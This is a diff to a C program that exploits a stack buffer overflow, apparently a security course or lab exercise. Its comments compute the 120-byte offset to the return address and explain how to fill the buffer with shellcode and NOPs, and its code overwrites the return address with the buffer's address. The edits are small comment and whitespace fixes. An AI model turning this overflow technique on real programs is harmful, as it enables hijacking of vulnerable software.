@@ -16,7 +16,8 @@
 
 //The difference between the rip (program counter) and the address of buf is 0x3021fec8 - 0x3021fe50 = 0x78 = 120
 //We need to fill the buffer with 120 bytes of shellcode, and No-OPs
-//Then 8 bytes of the return address of buffer (0x3021fe50)
+//Then 4 bytes of the return address of buffer (0x3021fe50)
+//Followed by a '\0'
 
 #define BUF_SIZE 125
 
@@ -44,7 +45,7 @@ main ( int argc, char * argv[] )
 	*newReturnAddress = 0x3021fe50;
 
 	//The bufferExploit string will end with NULL
-    	bufferExploit[124] = '\0';
+    bufferExploit[124] = '\0';
 
 	args[0] = TARGET;
 	//args[1] = "hi there";
